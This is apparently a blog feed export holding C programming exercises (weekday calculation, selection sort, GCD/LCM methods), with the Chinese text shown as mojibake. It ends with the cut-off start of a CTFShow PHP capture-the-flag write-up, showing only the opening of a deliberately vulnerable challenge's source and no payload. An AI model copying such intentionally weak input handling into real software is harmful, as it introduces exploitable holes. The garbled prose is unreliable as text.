class="line">				month=<span class="number">14</span>;</span><br><span class="line">				year--;</span><br><span class="line">			&#125;</span><br><span class="line">	w=(day+<span class="number">2</span>*month+<span class="number">3</span>*(month+<span class="number">1</span>)/<span class="number">5</span>+year+year/<span class="number">4</span>-year/<span class="number">100</span>+year/<span class="number">400</span>+<span class="number">1</span>)%<span class="number">7</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d/%d/%d :%s\n&quot;</span>,year,month,day,weekday[w]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="â‘¡ï¼š"><a href="#â‘¡ï¼š" class="headerlink" title="â‘¡ï¼š"></a>â‘¡ï¼š</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> year,month,day,weekday;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥å¹´/æœˆ/æ—¥:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;year,&amp;month,&amp;day);</span><br><span class="line">	<span class="keyword">if</span>(month==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			month=<span class="number">13</span>;</span><br><span class="line">			year--;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(month==<span class="number">2</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				month=<span class="number">14</span>;</span><br><span class="line">				year--;</span><br><span class="line">			&#125;</span><br><span class="line">	weekday=(day+<span class="number">2</span>*month+<span class="number">3</span>*(month+<span class="number">1</span>)/<span class="number">5</span>+year+year/<span class="number">4</span>-year/<span class="number">100</span>+year/<span class="number">400</span>+<span class="number">1</span>)%<span class="number">7</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d/%d/%d :&quot;</span>,year,month,day);</span><br><span class="line">	<span class="keyword">switch</span>(weekday)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">puts</span>(<span class="string">&quot;Sunday&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:<span class="built_in">puts</span>(<span class="string">&quot;Monday&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:<span class="built_in">puts</span>(<span class="string">&quot;Tuesday&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:<span class="built_in">puts</span>(<span class="string">&quot;Wednesday&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:<span class="built_in">puts</span>(<span class="string">&quot;Thursday&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>:<span class="built_in">puts</span>(<span class="string">&quot;Friday&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">6</span>:<span class="built_in">puts</span>(<span class="string">&quot;Saturday&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š </p>
<p><img src="/2019/08/12/OLD/x.jpg"></p>
<h2 id="é€‰æ‹©æ’åº"><a href="#é€‰æ‹©æ’åº" class="headerlink" title="é€‰æ‹©æ’åº"></a>é€‰æ‹©æ’åº</h2><p>é€‰æ‹©æ’åº  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥%dä¸ªæ•°ï¼š\n&quot;</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N<span class="number">-1</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;N;j++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(a[j]&gt;a[i])			<span class="comment">// &gt; ä¸ºé™åºï¼Œ&lt; ä¸ºå‡åº</span></span><br><span class="line">						&#123;</span><br><span class="line">							t=a[j],a[j]=a[i],a[i]=t;</span><br><span class="line">						&#125;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;é€‰æ‹©æ’åº é™åºï¼š\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/8.png"></p>
<h2 id="æ¸”å¤«æ‰“æ¸”æ™’ç½‘"><a href="#æ¸”å¤«æ‰“æ¸”æ™’ç½‘" class="headerlink" title="æ¸”å¤«æ‰“æ¸”æ™’ç½‘"></a>æ¸”å¤«æ‰“æ¸”æ™’ç½‘</h2><p>å¦‚æœä¸€ä¸ªæ¸”å¤«ä» 2019 å¹´ 1 æœˆ 1 æ—¥å¼€å§‹æ¯ä¸‰å¤©æ‰“ä¸€æ¬¡æ¸”ï¼Œä¸¤å¤©æ™’ä¸€æ¬¡ç½‘ï¼Œç¼–ç¨‹å®ç°å½“è¾“å…¥ 2019 1 æœˆ 1 æ—¥ä»¥åçš„ä»»æ„ä¸€å¤©ï¼Œè¾“å‡ºè¯¥æ¸”å¤«æ˜¯åœ¨æ‰“æ¸”è¿˜æ˜¯åœ¨æ™’ç½‘ã€‚</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*å¦‚æœä¸€ä¸ªæ¸”å¤«ä» 2019 å¹´ 1 æœˆ 1 æ—¥å¼€å§‹æ¯ä¸‰å¤©æ‰“ä¸€æ¬¡æ¸”ï¼Œä¸¤å¤©æ™’ä¸€æ¬¡ç½‘ï¼Œ</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ç¼–ç¨‹å®ç°å½“è¾“å…¥ 2011 1 æœˆ 1 æ—¥ä»¥åçš„ä»»æ„ä¸€å¤©ï¼Œè¾“å‡ºè¯¥æ¸”å¤«æ˜¯åœ¨æ‰“æ¸”è¿˜æ˜¯åœ¨æ™’ç½‘ã€‚*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*(1) è‡ªå®šä¹‰å‡½æ•° leap()ï¼Œç”¨æ¥åˆ¤æ–­è¾“å…¥çš„å¹´ä»½æ˜¯å¦æ˜¯é—°å¹´ã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  (2) è‡ªå®šä¹‰å‡½æ•° number()ï¼Œç”¨æ¥è®¡ç®—è¾“å…¥æ—¥æœŸè· 2019 å¹´ 1 æœˆ 1 æ—¥å…±æœ‰å¤šå°‘å¤©ã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  (3) main() å‡½æ•°ä½œä¸ºç¨‹åºçš„å…¥å£å‡½æ•°ï¼Œåœ¨ main() å‡½æ•°ä¸­è°ƒç”¨ä¸Šé¢ä¸¤ä¸ªå‡½æ•°ã€‚ç¨‹åºä»£ç å¦‚ä¸‹ï¼š*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">leap</span><span class="params">(<span class="keyword">int</span> year)</span></span>;				<span class="comment">//å‡½æ•°å£°æ˜ </span></span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">number</span><span class="params">(<span class="keyword">int</span> y,<span class="keyword">int</span> m,<span class="keyword">int</span> d)</span></span>;</span><br><span class="line">	 </span><br><span class="line">	<span class="keyword">int</span> year,month,day,sum=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥å¹´/æœˆ/æ—¥:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;year,&amp;month,&amp;day);</span><br><span class="line">	<span class="keyword">if</span>(leap(year)==<span class="number">366</span>)					<span class="comment">//é—°å¹´||å¹³å¹´ </span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%då¹´æ˜¯é—°å¹´!\n&quot;</span>,year);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%då¹´æ˜¯å¹³å¹´!\n&quot;</span>,year);</span><br><span class="line">	</span><br><span class="line">	sum=number(year,month,day);	<span class="comment">//è°ƒç”¨å‡½æ•°æ±‚å¤©æ•° </span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(sum%<span class="number">5</span>&lt;<span class="number">4</span>&amp;&amp;sum%<span class="number">5</span>&gt;<span class="number">0</span>)	<span class="comment">//å¦‚æœä½™æ•° ä¸º 1,2,3 å°±æ‰“æ¸”ï¼Œå¦åˆ™å°± æ™’ç½‘ </span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d/%d/%d :æ‰“æ¸”!\n&quot;</span>,year,month,day);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d/%d/%d :æ™’ç½‘!\n&quot;</span>,year,month,day);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">leap</span><span class="params">(<span class="keyword">int</span> year)</span><span class="comment">//æ±‚é—°å¹´ï¼Œå¹³å¹´ </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>||year%<span class="number">400</span>==<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">366</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">365</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">number</span><span class="params">(<span class="keyword">int</span> y,<span class="keyword">int</span> m,<span class="keyword">int</span> d)</span><span class="comment">//æ±‚æŸæ—¥ æ˜¯è¿™å¹´çš„å¤šå°‘å¤© </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span>(m<span class="number">-1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">11</span>:d+=<span class="number">30</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">10</span>:d+=<span class="number">31</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">9</span>:d+=<span class="number">30</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">8</span>:d+=<span class="number">31</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">7</span>:d+=<span class="number">31</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">6</span>:d+=<span class="number">30</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">5</span>:d+=<span class="number">31</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">4</span>:d+=<span class="number">30</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">3</span>:d+=<span class="number">31</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">2</span>:<span class="keyword">if</span>(y%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;y%<span class="number">100</span>!=<span class="number">0</span>||y%<span class="number">400</span>==<span class="number">0</span>)</span><br><span class="line">						d+=<span class="number">29</span>;</span><br><span class="line">					<span class="keyword">else</span>	</span><br><span class="line">						d+=<span class="number">28</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">1</span>:d+=<span class="number">31</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š </p>
<p><img src="/2019/08/12/OLD/yf.jpg"></p>
<h2 id="è¾“å…¥ä¸€ä¸²å­—ç¬¦ç»Ÿè®¡é‡Œé¢å„ä¸ªå¤§å†™å­—æ¯çš„ä¸ªæ•°"><a href="#è¾“å…¥ä¸€ä¸²å­—ç¬¦ç»Ÿè®¡é‡Œé¢å„ä¸ªå¤§å†™å­—æ¯çš„ä¸ªæ•°" class="headerlink" title="è¾“å…¥ä¸€ä¸²å­—ç¬¦ç»Ÿè®¡é‡Œé¢å„ä¸ªå¤§å†™å­—æ¯çš„ä¸ªæ•°"></a>è¾“å…¥ä¸€ä¸²å­—ç¬¦ç»Ÿè®¡é‡Œé¢å„ä¸ªå¤§å†™å­—æ¯çš„ä¸ªæ•°</h2><p><em>ï¼ˆå…¶å®ƒå­—ç¬¦åŒç†ï¼‰</em></p>
<p>æºä»£ç ï¼š  </p>
<p><strong>æ— è¯¦è§£ï¼å…·ä½“è‡ªå·±åˆ†æï¼</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sum[<span class="number">26</span>],i;</span><br><span class="line">	<span class="keyword">char</span> ch;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)</span><br><span class="line">		sum[i]=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>((ch=getchar())!=<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span>(ch&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">			sum[ch<span class="number">-65</span>]++;	 </span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)</span><br><span class="line">		<span class="keyword">if</span>(sum[i]!=<span class="number">0</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;å­—æ¯ %c æœ‰ %d ä¸ª!\n&quot;</span>,i+<span class="number">65</span>,sum[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/HOW.jpg"></p>
<h2 id="æœ€å¤§å…¬çº¦æ•°-amp-amp-æœ€å°å…¬å€æ•°"><a href="#æœ€å¤§å…¬çº¦æ•°-amp-amp-æœ€å°å…¬å€æ•°" class="headerlink" title="æœ€å¤§å…¬çº¦æ•°&amp;&amp;æœ€å°å…¬å€æ•°"></a>æœ€å¤§å…¬çº¦æ•°&amp;&amp;æœ€å°å…¬å€æ•°</h2><p><strong>å…¬çº¦æ•°</strong>ï¼Œäº¦ç§°â€œå…¬å› æ•°â€ã€‚å®ƒæ˜¯ä¸€ä¸ªèƒ½è¢«è‹¥å¹²ä¸ªæ•´æ•°åŒæ—¶å‡æ•´é™¤çš„<a href="https://baike.baidu.com/item/%E6%95%B4%E6%95%B0/1293937">æ•´æ•°</a>ã€‚å¦‚æœä¸€ä¸ªæ•´æ•°åŒæ—¶æ˜¯å‡ ä¸ªæ•´æ•°çš„<a href="https://baike.baidu.com/item/%E7%BA%A6%E6%95%B0/8417882">çº¦æ•°</a>ï¼Œç§°è¿™ä¸ªæ•´æ•°ä¸ºå®ƒä»¬çš„â€œå…¬çº¦æ•°â€ï¼›å…¬çº¦æ•°ä¸­æœ€å¤§çš„ç§°ä¸ºæœ€å¤§å…¬çº¦æ•°ã€‚å¯¹ä»»æ„çš„è‹¥å¹²ä¸ªæ­£æ•´æ•°ï¼Œ1æ€»æ˜¯å®ƒä»¬çš„å…¬å› æ•°ã€‚  </p>
<p><strong>å…¬å€æ•°</strong>(common multiple)æ˜¯æŒ‡åœ¨ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„è‡ªç„¶æ•°ä¸­ï¼Œå¦‚æœå®ƒä»¬æœ‰ç›¸åŒçš„å€æ•°ï¼Œè¿™äº›å€æ•°å°±æ˜¯å®ƒä»¬çš„å…¬å€æ•°ã€‚å…¬å€æ•°ä¸­æœ€å°çš„ï¼Œå°±ç§°ä¸ºè¿™äº›<a href="https://baike.baidu.com/item/%E6%95%B4%E6%95%B0/1293937">æ•´æ•°</a>çš„<strong>æœ€å°å…¬å€æ•°</strong>ï¼ˆlowest common multipleï¼‰</p>
<p>ç¤ºæ„å›¾ï¼š  </p>
<p><img src="/2019/08/12/OLD/007.jpg"></p>
<h3 id="ç©·ä¸¾æ³•"><a href="#ç©·ä¸¾æ³•" class="headerlink" title="ç©·ä¸¾æ³•"></a>ç©·ä¸¾æ³•</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_gys</span><span class="params">(<span class="keyword">int</span> number,<span class="keyword">int</span> number_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,gys=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(number&gt;number_2)</span><br><span class="line">		i=number,number=number_2,number_2=i;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=number;i++)	</span><br><span class="line">		<span class="keyword">if</span>(number%i==<span class="number">0</span>&amp;&amp;number_2%i==<span class="number">0</span>)</span><br><span class="line">			gys=i;</span><br><span class="line">	<span class="keyword">return</span> gys;</span><br><span class="line">	<span class="comment">/*for(i=number;i&gt;0;i--)	</span></span><br><span class="line"><span class="comment">		if(number%i==0&amp;&amp;number_2%i==0)</span></span><br><span class="line"><span class="comment">			&#123;gys=i;break;&#125;</span></span><br><span class="line"><span class="comment">	return gys;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">min_gbs</span><span class="params">(<span class="keyword">int</span> number,<span class="keyword">int</span> number_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,gbs;</span><br><span class="line">	<span class="keyword">if</span>(number&gt;number_2)</span><br><span class="line">		i=number,number=number_2,number_2=i;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">for</span>(i=number;i&gt;<span class="number">0</span>;i++)</span><br><span class="line">		<span class="keyword">if</span>(i%number==<span class="number">0</span>&amp;&amp;i%number_2==<span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				gbs=i;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">	<span class="keyword">return</span> gbs;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,a,b,m,n,t,gy,gb;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸¤ä¸ªæ•°ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">	m=a,n=b;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d å’Œ %d çš„æœ€å¤§å…¬çº¦æ•°ï¼š%d\n&quot;</span>,m,n,max_gys(a,b));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d å’Œ %d çš„æœ€å°å…¬å€æ•°ï¼š%d\n&quot;</span>,m,n,min_gbs(a,b));	</span><br><span class="line">	<span class="comment">/*gb=m*n/max_gys(a,b);//æœ€å°å…¬å€æ•° ä¹Ÿå¯ä»¥ ä¸¤æ•°ç›¸ä¹˜é™¤ä»¥æœ€å¤§å…¬çº¦æ•° */</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="çŸ­é™¤æ³•"><a href="#çŸ­é™¤æ³•" class="headerlink" title="çŸ­é™¤æ³•"></a>çŸ­é™¤æ³•</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_gys</span><span class="params">(<span class="keyword">int</span> number,<span class="keyword">int</span> number_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,gys=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(number&lt;number_2)</span><br><span class="line">		i=number,number=number_2,number_2=i;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=number; )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(number%i==<span class="number">0</span>&amp;&amp;number_2%i==<span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					number/=i;</span><br><span class="line">					number_2/=i;</span><br><span class="line">					gys*=i;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				i++;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> gys;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,a,b,m,n,gy=<span class="number">1</span>,gb=<span class="number">1</span>,t;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸¤ä¸ªæ•°å­—ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">	m=a,n=b;	</span><br><span class="line">   	gb=m*n/max_gys(a,b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d å’Œ %dçš„æœ€å¤§å…¬çº¦æ•°ä¸ºï¼š%d\n&quot;</span>,m,n,max_gys(a,b));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d å’Œ %dçš„æœ€å°å…¬å€æ•°ä¸ºï¼š%d\n&quot;</span>,m,n,gb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="è¾—è½¬ç›¸é™¤æ³•"><a href="#è¾—è½¬ç›¸é™¤æ³•" class="headerlink" title="è¾—è½¬ç›¸é™¤æ³•"></a>è¾—è½¬ç›¸é™¤æ³•</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,b,r,m,n,gb;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸¤ä¸ªæ•°ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">	m=a,n=b;</span><br><span class="line">	<span class="keyword">while</span>(b)			<span class="comment">//b=r å³ç”¨ a%b ä½œä¸ºå¾ªç¯æ¡ä»¶ </span></span><br><span class="line">		&#123;</span><br><span class="line">			r=a%b;</span><br><span class="line">			a=b;		<span class="comment">//æœ€å¤§å…¬çº¦æ•° ä¸º a  </span></span><br><span class="line">			b=r;	</span><br><span class="line">		&#125;</span><br><span class="line">	gb=m*n/a;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%då’Œ%dçš„æœ€å¤§å…¬çº¦æ•°ä¸ºï¼š%d\n&quot;</span>,m,n,a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%då’Œ%dçš„æœ€å°å…¬å€æ•°ä¸ºï¼š%d\n&quot;</span>,m,n,gb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="å‡æ³•"><a href="#å‡æ³•" class="headerlink" title="å‡æ³•"></a>å‡æ³•</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,b,m,n,gb;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸¤ä¸ªæ•°ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">	m=a,n=b;</span><br><span class="line">	<span class="keyword">while</span>(a!=b)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(a&gt;b)		<span class="comment">//æœ€å¤§å…¬çº¦æ•° ä¸º a  </span></span><br><span class="line">				a-=b;</span><br><span class="line">			<span class="keyword">if</span>(b&gt;a)</span><br><span class="line">				b-=a;</span><br><span class="line">		&#125;</span><br><span class="line">	gb=m*n/a;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%då’Œ%dçš„æœ€å¤§å…¬çº¦æ•°ä¸ºï¼š%d\n&quot;</span>,m,n,a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%då’Œ%dçš„æœ€å°å…¬å€æ•°ä¸ºï¼š%d\n&quot;</span>,m,n,gb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/233.jpg"></p>
]]></content>
      <categories>
        <category>Cè¯­è¨€</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFShow PHPç‰¹æ€§</title>
    <url>/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<h1 id="CTFShow-PHP-ç‰¹æ€§"><a href="#CTFShow-PHP-ç‰¹æ€§" class="headerlink" title="CTFShow PHP ç‰¹æ€§"></a>CTFShow PHP ç‰¹æ€§</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p>æºç :</p>
<span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 15:38:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span 